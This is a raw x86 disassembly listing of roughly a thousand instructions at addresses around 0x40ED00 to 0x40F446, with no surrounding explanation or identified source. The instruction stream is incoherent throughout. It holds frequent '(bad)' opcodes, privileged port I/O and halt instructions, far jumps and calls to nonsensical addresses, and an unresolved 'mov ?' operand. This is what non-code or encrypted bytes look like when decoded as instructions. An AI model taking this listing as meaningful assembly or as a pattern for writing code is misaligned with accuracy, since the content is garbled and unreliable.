  40eced:	mov    esi,0x74954f76
  40ecf2:	pop    esp
  40ecf3:	push   ebx
  40ecf4:	hlt    
  40ecf5:	pusha  
  40ecf6:	pop    es
  40ecf7:	mov    BYTE PTR [edi+0x5ede38db],bh
  40ecfd:	pop    eax
  40ecfe:	ror    BYTE PTR [ebx+0x23],0xc3
  40ed02:	pop    ebp
  40ed03:	scas   eax,DWORD PTR es:[edi]
  40ed04:	inc    esi
  40ed05:	popa   
  40ed06:	movzx  ebp,bh
  40ed09:	in     eax,dx
  40ed0a:	mov    es,edx
  40ed0c:	xchg   ebx,eax
  40ed0d:	sub    dh,ch
  40ed0f:	aad    0x82
  40ed11:	jmp    0xa171:0xb7c6b9b8
  40ed18:	idiv   esp
  40ed1a:	add    BYTE PTR [edx+ebp*1],dh
  40ed1d:	test   ebp,0xa8906493
  40ed23:	inc    ebp
  40ed24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed25:	add    BYTE PTR [ebp+0x7813b4eb],0x81
  40ed2c:	add    esp,DWORD PTR [ecx-0x29]
  40ed2f:	mov    esi,0x5b12d2bc
  40ed34:	stos   BYTE PTR es:[edi],al
  40ed35:	dec    esp
  40ed36:	out    dx,eax
  40ed37:	or     edx,DWORD PTR [edi]
  40ed39:	lock call 0x94c1593e
  40ed3f:	ja     0x40edbe
  40ed41:	sub    bh,BYTE PTR ds:0x77a6c4a8
  40ed47:	and    BYTE PTR [ebx],cl
  40ed49:	sar    DWORD PTR [esi],1
  40ed4b:	(bad)
  40ed4e:	out    dx,eax
  40ed4f:	sbb    esi,DWORD PTR [ebp-0x8]
  40ed52:	ret    0xfc40
  40ed55:	adc    edx,DWORD PTR [edi-0x344b750a]
  40ed5b:	bnd jg 0x40edbf
  40ed5e:	test   DWORD PTR [esi+ebx*8],0x32a6cdad
  40ed65:	push   es
  40ed66:	or     eax,0xeb78f676
  40ed6b:	call   0x996f7d5f
  40ed70:	in     eax,dx
  40ed71:	enter  0xf7e7,0xe2
  40ed75:	pusha  
  40ed76:	push   0x22507284
  40ed7b:	sub    al,0x14
  40ed7d:	mov    fs,ecx
  40ed7f:	mov    BYTE PTR [esi+0x37],bl
  40ed82:	push   cs
  40ed83:	(bad)  
  40ed85:	sub    ah,ah
  40ed87:	iret   
  40ed88:	mov    eax,0xde78af62
  40ed8d:	add    BYTE PTR [edx-0x3eac13fe],bl
  40ed93:	ficom  WORD PTR [edx]
  40ed95:	lea    eax,[ecx-0x3cd33d60]
  40ed9b:	mov    al,ds:0x191a867d
  40eda0:	inc    ebx
  40eda1:	pop    esi
  40eda2:	push   eax
  40eda3:	dec    eax
  40eda4:	test   al,0xa4
  40eda6:	imul   ebx,DWORD PTR [edx-0x223ddd1a],0xcf71785e
  40edb0:	test   eax,ebp
  40edb2:	jb     0x40ed8b
  40edb4:	retf   
  40edb5:	pusha  
  40edb6:	std    
  40edb7:	cmp    BYTE PTR [ebx-0x7e7fab0e],bl
  40edbd:	gs add edx,ebp
  40edc0:	cmp    BYTE PTR [ebx+0x2e],bh
  40edc3:	fwait
  40edc4:	ja     0x40ee17
  40edc6:	js     0x40edbc
  40edc8:	xor    al,0x5d
  40edca:	retf   0xd84b
  40edcd:	mov    ch,0x8f
  40edcf:	and    ebp,eax
  40edd1:	out    dx,eax
  40edd2:	mov    edx,0xedfc5e01
  40edd7:	in     al,0xd1
  40edd9:	lahf   
  40edda:	mov    ebp,0xb760abae
  40eddf:	xor    edx,DWORD PTR [ebp+0x3d]
  40ede2:	sbb    DWORD PTR [edx+0x1d],edi
  40ede5:	cmp    bh,0x2
  40ede8:	jmp    esp
  40edea:	outs   dx,BYTE PTR ds:[esi]
  40edeb:	scas   al,BYTE PTR es:[edi]
  40edec:	adc    eax,0x62415333
  40edf1:	popa   
  40edf2:	cmp    ecx,DWORD PTR [esi-0x14]
  40edf5:	aas    
  40edf6:	loope  0x40ed7b
  40edf8:	out    dx,eax
  40edf9:	sub    esi,ebp
  40edfb:	popf   
  40edfc:	mov    ds:0xfb07a33,eax
  40ee01:	xchg   ebp,edi
  40ee03:	mov    al,ds:0x8710d777
  40ee08:	cmp    DWORD PTR [esi-0x28],0xffffffc3
  40ee0c:	pop    esi
  40ee0d:	dec    esp
  40ee0e:	imul   ecx,DWORD PTR [ecx],0x36f064f7
  40ee14:	cwde   
  40ee15:	pusha  
  40ee16:	js     0x40ee19
  40ee18:	pop    ebx
  40ee19:	jno    0x40ee6d
  40ee1b:	and    bl,al
  40ee1d:	add    bl,BYTE PTR [di]
  40ee20:	jb     0x40ee2d
  40ee22:	xor    al,0x3d
  40ee24:	mov    cl,0xe9
  40ee26:	or     ch,BYTE PTR ds:0xd909465e
  40ee2c:	mov    bl,0xe8
  40ee2e:	dec    esi
  40ee2f:	mov    eax,ds:0x478927d2
  40ee34:	sbb    eax,0x594d78f5
  40ee39:	xor    dh,al
  40ee3b:	popa   
  40ee3c:	(bad)  
  40ee3d:	mov    ecx,0xd3323c96
  40ee42:	es clc 
  40ee44:	ins    BYTE PTR es:[edi],dx
  40ee45:	pusha  
  40ee46:	shl    dh,1
  40ee48:	mov    bh,0xe2
  40ee4a:	leave  
  40ee4b:	dec    esi
  40ee4c:	dec    ecx
  40ee4d:	jo     0x40ee39
  40ee4f:	xlat   BYTE PTR ds:[ebx]
  40ee50:	adc    ch,BYTE PTR [esi]
  40ee52:	jecxz  0x40ee88
  40ee54:	enter  0xf95d,0x63
  40ee58:	and    ebx,DWORD PTR [ebp+0x410cbb65]
  40ee5e:	mov    ah,0xe6
  40ee60:	pop    esi
  40ee61:	sbb    BYTE PTR [esi+0x1810afdf],al
  40ee67:	pop    ebp
  40ee68:	dec    edx
  40ee69:	popa   
  40ee6a:	push   ebx
  40ee6b:	hlt    
  40ee6c:	mov    bh,0xfa
  40ee6e:	adc    al,0xb1
  40ee70:	int3   
  40ee71:	or     al,0xee
  40ee73:	retf   
  40ee74:	ret    0xb07b
  40ee77:	mov    edx,DWORD PTR [esi+0x4bebe01a]
  40ee7d:	inc    ebp
  40ee7e:	pop    esi
  40ee7f:	and    DWORD PTR [ebx-0x66],0xffffff97
  40ee83:	shl    BYTE PTR [eax+eiz*8-0xb],cl
  40ee87:	sbb    al,0xa5
  40ee89:	xor    al,0xe7
  40ee8b:	pop    esp
  40ee8c:	xchg   BYTE PTR [edx],bl
  40ee8e:	adc    al,0x96
  40ee90:	mov    ds,esi
  40ee92:	xor    al,0x33
  40ee94:	jne    0x40eef4
  40ee96:	sbb    al,0xbf
  40ee98:	sahf   
  40ee99:	test   DWORD PTR [ecx-0x49],ecx
  40ee9c:	jle    0x40eec3
  40ee9e:	call   0x75134d39
  40eea3:	in     al,0x96
  40eea5:	gs push cs
  40eea7:	ds jb  0x40ef0a
  40eeaa:	mov    edi,0x35491407
  40eeaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eeb0:	xor    ah,al
  40eeb2:	jmp    0x9ec2:0x8a42f926
  40eeb9:	test   DWORD PTR [eax],edx
  40eebb:	(bad)  
  40eebc:	repnz push ecx
  40eebe:	or     ch,BYTE PTR [ebx+0x20]
  40eec1:	pop    edi
  40eec2:	into   
  40eec3:	sbb    DWORD PTR [ebx-0x72],edi
  40eec6:	jmp    0x40ef35
  40eec8:	pop    esi
  40eec9:	mov    ds:0x991ed5b1,eax
  40eece:	ins    DWORD PTR es:[edi],dx
  40eecf:	inc    esi
  40eed0:	xor    al,0x61
  40eed2:	sub    edi,DWORD PTR [eax-0xb]
  40eed5:	mov    bh,0x45
  40eed7:	xchg   BYTE PTR [eax],dl
  40eed9:	add    dh,al
  40eedb:	sub    al,0xd6
  40eedd:	shl    DWORD PTR [ecx+eiz*2-0x18],0xe5
  40eee2:	stos   DWORD PTR es:[edi],eax
  40eee3:	pop    edx
  40eee4:	and    eax,0xdba0b724
  40eee9:	cwde   
  40eeea:	cld    
  40eeeb:	push   si
  40eeed:	sub    DWORD PTR [esi-0x7331a1f9],edx
  40eef3:	repnz (bad) 
  40eef5:	jmp    0xad6:0x60da2bd2
  40eefc:	mov    cs,WORD PTR [ecx+0x66]
  40eeff:	outs   dx,BYTE PTR ds:[esi]
  40ef00:	repnz hlt 
  40ef02:	out    0xe8,eax
  40ef04:	nop
  40ef05:	popa   
  40ef06:	imul   ebp,DWORD PTR ds:0x4b1b463e,0x55
  40ef0d:	popa   
  40ef0e:	add    cl,BYTE PTR [ebx-0x57997a0d]
  40ef14:	aaa    
  40ef15:	ss out dx,al
  40ef17:	mov    ebp,0x8db8c7a5
  40ef1c:	addr16 push esp
  40ef1e:	popf   
  40ef1f:	lea    ecx,[ecx]
  40ef21:	sti    
  40ef22:	(bad)  [eax+0x2a9b1e14]
  40ef28:	mov    ebx,0x8920f8b5
  40ef2d:	pushf  
  40ef2e:	out    dx,al
  40ef2f:	out    dx,eax
  40ef30:	cwde   
  40ef31:	push   DWORD PTR [esi-0x71]
  40ef34:	shl    BYTE PTR [eax-0x15],cl
  40ef37:	stos   DWORD PTR es:[edi],eax
  40ef38:	jno    0x40ef5f
  40ef3a:	stc    
  40ef3b:	jns    0x40ef5f
  40ef3d:	(bad)  
  40ef3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef40:	push   ebx
  40ef41:	repz cmp BYTE PTR [eax-0x5ec573b1],0xbe
  40ef49:	lods   eax,DWORD PTR ds:[esi]
  40ef4a:	inc    eax
  40ef4b:	cld    
  40ef4c:	xlat   BYTE PTR ds:[ebx]
  40ef4d:	jno    0x40ef74
  40ef4f:	and    ebx,DWORD PTR [ebp-0x78]
  40ef52:	push   ecx
  40ef53:	ret    0xb0f8
  40ef56:	mov    DWORD PTR [eax-0x5a3362c2],edi
  40ef5c:	fsubp  st(3),st
  40ef5e:	pop    ecx
  40ef5f:	retf   
  40ef60:	ds popf 
  40ef62:	cld    
  40ef63:	pusha  
  40ef64:	clc    
  40ef65:	es loop 0x40ef45
  40ef68:	es sbb eax,eax
  40ef6b:	mov    al,ds:0x5cfd848a
  40ef70:	(bad)  
  40ef72:	or     BYTE PTR [esi+0x180be2f9],ah
  40ef78:	daa    
  40ef79:	loope  0x40efaf
  40ef7b:	leave  
  40ef7c:	sub    eax,0x9d24ee7d
  40ef81:	mov    eax,ds:0x4a0421b
  40ef86:	pop    ss
  40ef87:	repnz push esp
  40ef89:	imul   edx,DWORD PTR [eax],0x40a2dbe7
  40ef8f:	ds jne 0x40eff2
  40ef92:	mov    al,0xe7
  40ef94:	pusha  
  40ef95:	push   0xfe5e67e6
  40ef9a:	sbb    dh,BYTE PTR [edx]
  40ef9c:	es push ds
  40ef9e:	(bad)  [esi-0x3f9cb5b2]
  40efa4:	push   ss
  40efa5:	pusha  
  40efa6:	or     dh,BYTE PTR [ebx]
  40efa8:	test   eax,0xa3b116cc
  40efad:	imul   ebp,esi,0x9e0ade51
  40efb3:	jae    0x40ef55
  40efb5:	and    DWORD PTR [ebp-0x5c],edi
  40efb8:	mov    esp,0x59cd762c
  40efbd:	pop    esi
  40efbe:	and    DWORD PTR [ebx+0x44],esi
  40efc1:	popa   
  40efc2:	pushf  
  40efc3:	pop    esi
  40efc4:	test   al,0x55
  40efc6:	adc    cl,BYTE PTR [edx+ecx*8+0x60]
  40efca:	push   ds
  40efcb:	fnsave [ebx+0x4a]
  40efce:	cdq    
  40efcf:	or     esp,DWORD PTR [edi+ebp*4+0x4c84c1ee]
  40efd6:	(bad)  
  40efd7:	cmp    al,0x9c
  40efd9:	cmc    
  40efda:	(bad)  
  40efdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efdc:	mov    al,0x95
  40efde:	push   es
  40efdf:	push   edx
  40efe0:	inc    DWORD PTR [eax+0x30]
  40efe3:	test   eax,0x8bee46fd
  40efe8:	sbb    eax,0x8b49f7d0
  40efed:	sbb    BYTE PTR cs:[ebp+0x897611b],al
  40eff4:	inc    eax
  40eff5:	cmp    edi,DWORD PTR [ebx]
  40eff7:	scas   eax,DWORD PTR es:[edi]
  40eff8:	daa    
  40eff9:	push   edx
  40effa:	out    dx,al
  40effb:	jbe    0x40ef95
  40effd:	fsub   st(4),st
  40efff:	mov    ah,0x3f
  40f001:	dec    eax
  40f002:	les    esp,FWORD PTR [eax-0x6d4897a1]
  40f008:	in     eax,0xb1
  40f00a:	sub    ecx,esi
  40f00c:	pop    esi
  40f00d:	or     al,dh
  40f00f:	pop    ebp
  40f010:	popa   
  40f011:	arpl   WORD PTR es:[eax],cx
  40f014:	je     0x40efe6
  40f016:	xor    DWORD PTR [ebx-0x5e8ccab6],edx
  40f01c:	xchg   edx,eax
  40f01d:	in     al,dx
  40f01e:	cmp    esp,DWORD PTR [edx-0x42]
  40f021:	xor    eax,0xef557bee
  40f026:	es out 0xf9,al
  40f029:	inc    eax
  40f02a:	in     al,dx
  40f02b:	mov    al,ds:0x5d47d463
  40f030:	mov    ds:0x5e504196,eax
  40f035:	sub    esp,eax
  40f037:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f038:	(bad)  [ebx]
  40f03a:	pop    ebp
  40f03b:	mov    fs,WORD PTR cs:[eax-0x36]
  40f03f:	jge    0x40efe7
  40f041:	xchg   DWORD PTR [edx+0x9],ebx
  40f044:	test   al,0x2e
  40f046:	out    0xc6,eax
  40f048:	dec    ecx
  40f049:	test   al,0x1e
  40f04b:	into   
  40f04c:	mov    cs,WORD PTR [ecx+ebx*8-0x22]
  40f050:	xor    esp,DWORD PTR [ecx+0x5d]
  40f053:	imul   esi,DWORD PTR [edi+0x609ccf45],0x1b86ee33
  40f05d:	hlt    
  40f05e:	add    al,al
  40f060:	nop
  40f061:	aas    
  40f062:	jle    0x40f00c
  40f064:	mov    dl,0x97
  40f066:	ss rol edx,cl
  40f069:	inc    eax
  40f06a:	enter  0x1677,0xc
  40f06e:	out    dx,al
  40f06f:	dec    ebp
  40f070:	mov    bh,0xac
  40f072:	or     BYTE PTR [ebx-0x5f0653a3],bh
  40f078:	icebp  
  40f079:	cmc    
  40f07a:	dec    edi
  40f07b:	iret   
  40f07c:	sbb    al,0xa4
  40f07e:	or     ecx,0xdd7b7d5e
  40f084:	aam    0xf4
  40f086:	and    bh,dl
  40f088:	outs   dx,BYTE PTR ds:[esi]
  40f089:	pusha  
  40f08a:	xchg   ebp,eax
  40f08b:	mov    ?,WORD PTR [edi+0x7]
  40f08e:	fwait
  40f08f:	and    DWORD PTR [ebp+0x1f],ecx
  40f092:	out    dx,al
  40f093:	adc    dh,BYTE PTR [edx+0x4d]
  40f096:	int3   
  40f097:	xchg   ebp,eax
  40f098:	adc    ebx,DWORD PTR [ebp+ebp*8-0x5f]
  40f09c:	mov    BYTE PTR [ebx-0x1],dl
  40f09f:	rcr    BYTE PTR [ebp-0x427f5409],1
  40f0a5:	call   0x7d2f3e95
  40f0aa:	out    0x71,al
  40f0ac:	mov    eax,0xa9156a60
  40f0b1:	sbb    al,0x5c
  40f0b3:	cwde   
  40f0b4:	(bad)  
  40f0b6:	out    dx,al
  40f0b7:	add    al,0x75
  40f0b9:	inc    ebx
  40f0ba:	sbb    al,0xa3
  40f0bc:	jmp    0xaf98:0x35a12daf
  40f0c3:	adc    DWORD PTR [eax+0x5ebc510e],ecx
  40f0c9:	cmc    
  40f0ca:	mov    WORD PTR [esi-0x35],es
  40f0cd:	imul   ecx,DWORD PTR [edi-0x51a0d33d],0x1d
  40f0d4:	sub    eax,0x1e704691
  40f0d9:	clc    
  40f0da:	fstp   TBYTE PTR [edx+0x59]
  40f0dd:	out    dx,eax
  40f0de:	add    al,0x91
  40f0e0:	leave  
  40f0e1:	movd   mm7,DWORD PTR [edx+ebx*1-0x125e5916]
  40f0e9:	aaa    
  40f0ea:	adc    al,0x9b
  40f0ec:	jg     0x40f0b0
  40f0ee:	arpl   WORD PTR [ebx+ebp*8-0x354012b3],cx
  40f0f5:	xor    dl,cl
  40f0f7:	cwde   
  40f0f8:	pop    ebp
  40f0f9:	aad    0xde
  40f0fb:	add    DWORD PTR [edx],0x61
  40f0fe:	cmp    DWORD PTR [edi-0x1f],eax
  40f101:	xchg   edi,eax
  40f102:	push   ecx
  40f103:	ins    BYTE PTR es:[edi],dx
  40f104:	mov    al,0x62
  40f106:	out    dx,al
  40f107:	fcomp  st(7)
  40f109:	fiadd  DWORD PTR [eax+ebp*4-0x377c6f88]
  40f110:	std    
  40f111:	mov    esi,0x6f9b194e
  40f116:	out    dx,al
  40f117:	out    0x8d,eax
  40f119:	rcr    WORD PTR [esi+eax*1+0x45a16024],1
  40f121:	shr    DWORD PTR [esi+0x44d7a0de],0xfd
  40f128:	pop    esi
  40f129:	xor    esp,DWORD PTR [esi+edi*2+0x38]
  40f12d:	adc    al,0x7d
  40f12f:	mov    bh,BYTE PTR [edx]
  40f131:	popa   
  40f132:	push   ebp
  40f133:	aad    0x13
  40f135:	out    dx,al
  40f136:	or     al,0xfc
  40f138:	stos   BYTE PTR es:[edi],al
  40f139:	aam    0xce
  40f13b:	and    cl,BYTE PTR [eax+eax*8]
  40f13e:	mov    dl,0x60
  40f140:	cld    
  40f141:	mov    dh,0x76
  40f143:	mov    ds:0x68c22749,al
  40f148:	sbb    ebx,DWORD PTR [edx+0x12]
  40f14b:	pop    ecx
  40f14c:	scas   al,BYTE PTR es:[edi]
  40f14d:	and    bh,bh
  40f14f:	ds (bad) 
  40f151:	push   ds
  40f152:	out    dx,al
  40f153:	int    0xd6
  40f155:	aas    
  40f156:	and    eax,0xc8614b9b
  40f15b:	jg     0x40f143
  40f15d:	shl    BYTE PTR [ebp+0x6],1
  40f160:	or     BYTE PTR [eax-0xd],cl
  40f163:	or     eax,0xef858a60
  40f168:	stc    
  40f169:	pusha  
  40f16a:	ds lahf 
  40f16c:	jo     0x40f1af
  40f16e:	xor    cl,al
  40f170:	(bad)  
  40f171:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f172:	jmp    0x40f1d8
  40f174:	data16 fst DWORD PTR [ebp+0x67c158a7]
  40f17b:	shr    dh,cl
  40f17d:	pop    ecx
  40f17e:	adc    DWORD PTR [edi+0x42],0xffffff8f
  40f182:	pop    edx
  40f183:	xchg   ebp,eax
  40f184:	push   eax
  40f185:	loope  0x40f10e
  40f187:	mov    edi,0xbbf777cc
  40f18c:	xchg   esi,eax
  40f18d:	fisub  DWORD PTR [ecx+eiz*4-0x6e0b6d9f]
  40f194:	and    DWORD PTR [edx],ebx
  40f196:	out    dx,al
  40f197:	xchg   edi,eax
  40f198:	rcr    BYTE PTR [edi-0x1b],0x5a
  40f19c:	xor    esi,DWORD PTR ds:0xe38da0df
  40f1a2:	mov    edx,0x2e312506
  40f1a7:	cld    
  40f1a8:	scas   al,BYTE PTR es:[edi]
  40f1a9:	outs   dx,DWORD PTR ds:[esi]
  40f1aa:	out    dx,al
  40f1ab:	mov    ch,0x9c
  40f1ad:	inc    ebp
  40f1ae:	jbe    0x40f1e0
  40f1b0:	mov    ds,WORD PTR [ebx-0x60]
  40f1b3:	mov    eax,ds:0xbffbc8fd
  40f1b8:	dec    edx
  40f1b9:	mov    bl,BYTE PTR [esi]
  40f1bb:	xchg   ebx,eax
  40f1bc:	pop    ebx
  40f1bd:	xchg   edx,eax
  40f1be:	mov    dh,0x79
  40f1c0:	mov    bh,0xa0
  40f1c2:	jle    0x40f1f4
  40f1c4:	mov    edx,0x4d8f50d5
  40f1c9:	sbb    al,BYTE PTR [ebx]
  40f1cb:	loop   0x40f241
  40f1cd:	cmp    eax,0xa0d65543
  40f1d2:	pop    ebp
  40f1d3:	jbe    0x40f233
  40f1d5:	stos   DWORD PTR es:[edi],eax
  40f1d6:	push   ebx
  40f1d7:	inc    ebx
  40f1d8:	mov    esp,0x6eb15766
  40f1dd:	pusha  
  40f1de:	sub    cl,dh
  40f1e0:	ret    0xd2c9
  40f1e3:	or     eax,0xbfee86f8
  40f1e8:	(bad)  
  40f1e9:	push   edi
  40f1ea:	push   esi
  40f1eb:	leave  
  40f1ec:	xchg   DWORD PTR [ebx],esp
  40f1ee:	adc    al,bh
  40f1f0:	les    esp,FWORD PTR [ecx+0x4f]
  40f1f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1f4:	add    DWORD PTR [esp+ebx*2+0x5e04c71e],edx
  40f1fb:	dec    eax
  40f1fc:	shl    BYTE PTR [ebx+0x5b8407ee],0x5d
  40f203:	adc    eax,0x9bf5bd49
  40f208:	lock cwde 
  40f20a:	repnz (bad) 
  40f20c:	fdivp  st(4),st
  40f20e:	sti    
  40f20f:	xor    BYTE PTR [eax],ch
  40f211:	cmp    ch,ch
  40f213:	push   ebx
  40f214:	js     0x40f28e
  40f216:	loope  0x40f1c4
  40f218:	and    esi,DWORD PTR [ebx-0x36c842f2]
  40f21e:	lods   al,BYTE PTR ds:[esi]
  40f21f:	xchg   edi,eax
  40f220:	and    al,0x8f
  40f222:	loop   0x40f24e
  40f224:	arpl   WORD PTR [edx+0x2ac2e0fd],bx
  40f22a:	mov    bl,0x75
  40f22c:	jg     0x40f28e
  40f22e:	dec    eax
  40f22f:	div    BYTE PTR [eax+ebx*2-0x74594984]
  40f236:	(bad)  
  40f237:	stc    
  40f238:	fst    QWORD PTR [esi-0x52]
  40f23b:	fsub   DWORD PTR [ebp-0x69b8ed56]
  40f241:	sub    dh,BYTE PTR [ebp-0x5c]
  40f244:	sub    bh,bh
  40f246:	aam    0x43
  40f248:	cmp    al,0x81
  40f24a:	jbe    0x40f20e
  40f24c:	adc    BYTE PTR [eax],0xb6
  40f24f:	es scas eax,DWORD PTR es:[edi]
  40f251:	pop    esi
  40f252:	ins    BYTE PTR es:[edi],dx
  40f253:	out    0xdb,eax
  40f255:	sti    
  40f256:	inc    edi
  40f257:	and    DWORD PTR [edi-0x20da9c42],ebp
  40f25d:	pop    esi
  40f25e:	pop    esp
  40f25f:	ja     0x40f21c
  40f261:	imul   edx,DWORD PTR [edx],0x7b
  40f264:	sahf   
  40f265:	call   0x8ca8:0x94858211
  40f26c:	pop    esi
  40f26d:	or     BYTE PTR [eax+0x705231a6],dl
  40f273:	jne    0x40f1f5
  40f275:	pusha  
  40f276:	(bad)  
  40f278:	in     eax,0x9c
  40f27a:	pop    ss
  40f27b:	sbb    DWORD PTR [ebx-0x80],ecx
  40f27e:	lock or BYTE PTR [edi-0xe],ch
  40f282:	sbb    BYTE PTR [ecx-0x316c3402],ah
  40f288:	fwait
  40f289:	sub    eax,0xf76f7c85
  40f28e:	int    0xbd
  40f290:	out    dx,al
  40f291:	sbb    DWORD PTR [edx],eax
  40f293:	leave  
  40f294:	iret   
  40f295:	xchg   ebp,eax
  40f296:	out    dx,al
  40f297:	push   ebx
  40f298:	mov    edx,DWORD PTR [ebp-0x42a3eee3]
  40f29e:	out    dx,al
  40f29f:	test   al,0xed
  40f2a1:	jno    0x40f232
  40f2a3:	xchg   BYTE PTR ds:0xcca10bf8,dh
  40f2a9:	pop    ecx
  40f2aa:	repz sub edi,DWORD PTR [ecx+edi*4-0x5c]
  40f2af:	and    ebx,DWORD PTR [esi+0x2f]
  40f2b2:	xor    al,0xd5
  40f2b4:	imul   edi,DWORD PTR [ecx],0xffffffbe
  40f2b7:	adc    eax,0xc97651aa
  40f2bc:	sbb    esp,DWORD PTR [edi+0x6e]
  40f2bf:	inc    esp
  40f2c0:	and    ebx,DWORD PTR [eax]
  40f2c2:	retf   0x5a90
  40f2c5:	jl     0x40f307
  40f2c7:	outs   dx,DWORD PTR ds:[esi]
  40f2c8:	pop    edi
  40f2c9:	xor    ch,BYTE PTR [esi+0x56]
  40f2cc:	in     ax,dx
  40f2ce:	popa   
  40f2cf:	mov    eax,ds:0x96f07820
  40f2d4:	addr16 lahf 
  40f2d6:	loope  0x40f306
  40f2d8:	pop    esi
  40f2d9:	mov    ecx,0x1319687d
  40f2de:	pop    ebx
  40f2df:	push   esp
  40f2e0:	mov    al,0x60
  40f2e2:	dec    ebx
  40f2e3:	(bad)  
  40f2e4:	pop    ebp
  40f2e5:	inc    esi
  40f2e6:	loopne 0x40f361
  40f2e8:	mov    eax,ds:0x70f1f07b
  40f2ed:	out    0xc4,al
  40f2ef:	sub    BYTE PTR [edi+0x6d],0x3e
  40f2f3:	mov    cl,0x0
  40f2f5:	leave  
  40f2f6:	ins    DWORD PTR es:[edi],dx
  40f2f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2f8:	adc    cl,BYTE PTR [ebx-0x37]
  40f2fb:	mov    ch,0xe
  40f2fd:	cdq    
  40f2fe:	cs pop ebx
  40f300:	mov    eax,0x840ee4d
  40f305:	xor    DWORD PTR [ebp+0x2deb6c02],ebx
  40f30b:	mov    eax,ds:0xee6c6fce
  40f310:	cwde   
  40f311:	scas   al,BYTE PTR es:[edi]
  40f312:	sub    BYTE PTR [esi+ebx*2-0x40b968b],ch
  40f319:	cmp    edx,edi
  40f31b:	pushf  
  40f31c:	pop    edx
  40f31d:	popa   
  40f31e:	adc    esi,esi
  40f320:	dec    ebp
  40f321:	ins    DWORD PTR es:[edi],dx
  40f322:	pop    ss
  40f323:	jb     0x40f375
  40f325:	in     eax,0xeb
  40f327:	or     DWORD PTR [ebx],ecx
  40f329:	or     edx,DWORD PTR [ebp+esi*8-0x63fb1767]
  40f330:	js     0x40f392
  40f332:	pop    esp
  40f333:	dec    esi
  40f334:	sti    
  40f335:	ret    
  40f336:	mov    ch,0x0
  40f338:	les    ebx,FWORD PTR [ecx+0x3d109b01]
  40f33e:	outs   dx,BYTE PTR ds:[esi]
  40f33f:	aad    0x40
  40f341:	xor    cl,BYTE PTR [edx]
  40f343:	inc    esi
  40f344:	mov    eax,ds:0x240d7d60
  40f349:	in     eax,0xb
  40f34b:	push   0xffffffae
  40f34d:	or     esi,ebp
  40f34f:	sbb    esp,DWORD PTR [edi]
  40f351:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f352:	pop    edx
  40f353:	or     al,0x62
  40f355:	pop    es
  40f356:	and    BYTE PTR [esp+ecx*8-0x3289cbb1],ah
  40f35d:	ret    0xa236
  40f360:	fld    QWORD PTR [esi-0x12]
  40f363:	xor    DWORD PTR ds:0xbcdea389,0xafa0d8b8
  40f36d:	pop    ebx
  40f36e:	stc    
  40f36f:	fmul   st,st(4)
  40f371:	cmp    al,BYTE PTR [edi]
  40f373:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f374:	xor    DWORD PTR [ebp-0x4a26604e],eax
  40f37a:	xor    DWORD PTR [ecx],eax
  40f37c:	mov    ebx,edi
  40f37e:	out    dx,eax
  40f37f:	sub    BYTE PTR [esi],bl
  40f381:	popa   
  40f382:	add    eax,0xce5cd6b9
  40f387:	pop    ds
  40f388:	xor    esi,0xae1d7aec
  40f38e:	ret    0x6eab
  40f391:	and    BYTE PTR [ecx-0x79],dh
  40f394:	or     DWORD PTR [eax+0x2a],esp
  40f397:	cwde   
  40f398:	sub    edx,DWORD PTR [esi]
  40f39a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f39b:	push   0x3edb94ae
  40f3a0:	jbe    0x40f325
  40f3a2:	jmp    0x40f398
  40f3a4:	inc    eax
  40f3a5:	ret    
  40f3a6:	xor    ebp,DWORD PTR es:[ebx-0x5a723e30]
  40f3ad:	pusha  
  40f3ae:	xor    esp,DWORD PTR [edx-0x558becc2]
  40f3b4:	xor    BYTE PTR [esi],al
  40f3b6:	and    BYTE PTR [edi-0x7ac9ea0],bh
  40f3bc:	data16 sbb dh,BYTE PTR [edi]
  40f3bf:	aad    0x4
  40f3c1:	popa   
  40f3c2:	(bad)  
  40f3c3:	std    
  40f3c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3c5:	call   0xfcda0a9f
  40f3ca:	in     eax,dx
  40f3cb:	aaa    
  40f3cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3cd:	push   ecx
  40f3ce:	dec    eax
  40f3cf:	mov    ebx,0xd32ac87
  40f3d4:	mov    al,ds:0x26a5eb60
  40f3d9:	rcl    BYTE PTR [esi-0x112d91ff],cl
  40f3df:	xor    eax,0x94810cd3
  40f3e4:	ret    0x486d
  40f3e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3e8:	rol    BYTE PTR [edx],0x53
  40f3eb:	jbe    0x40f434
  40f3ed:	into   
  40f3ee:	xchg   esi,eax
  40f3ef:	pushf  
  40f3f0:	pslld  mm5,mm6
  40f3f3:	mov    dl,0x95
  40f3f5:	adc    DWORD PTR [ecx+0x21],eax
  40f3f8:	xchg   edx,eax
  40f3f9:	dec    ecx
  40f3fa:	frstor [eax+0x74b2ae4f]
  40f400:	adc    eax,0x5ec15725
  40f405:	jge    0x40f3b3
  40f407:	dec    edi
  40f408:	call   0xd631:0x1216a333
  40f40f:	mov    al,ds:0x804ef8b3
  40f414:	cmp    esp,DWORD PTR [edi]
  40f416:	sbb    ebx,DWORD PTR [ebx-0x7c]
  40f419:	adc    eax,0x5ebb801
  40f41e:	cs retf 
  40f420:	push   cs
  40f421:	lahf   
  40f422:	xchg   esp,eax
  40f423:	or     al,0x7c
  40f425:	pusha  
  40f426:	cmp    al,0xd9
  40f428:	mov    dh,0x90
  40f42a:	cmp    BYTE PTR [eax-0x20],ch
  40f42d:	mov    dl,0xec
  40f42f:	mov    esp,0xbb7e6dc9
  40f434:	loop   0x40f416
  40f436:	or     DWORD PTR [di],ecx
  40f439:	lahf   
  40f43a:	push   ecx
  40f43b:	int    0x1f
  40f43d:	xchg   esi,ebp
  40f43f:	ret    0xd20
  40f442:	add    ah,BYTE PTR [ecx+0x25]
  40f445:	push   es
  40f446:	out    dx,al
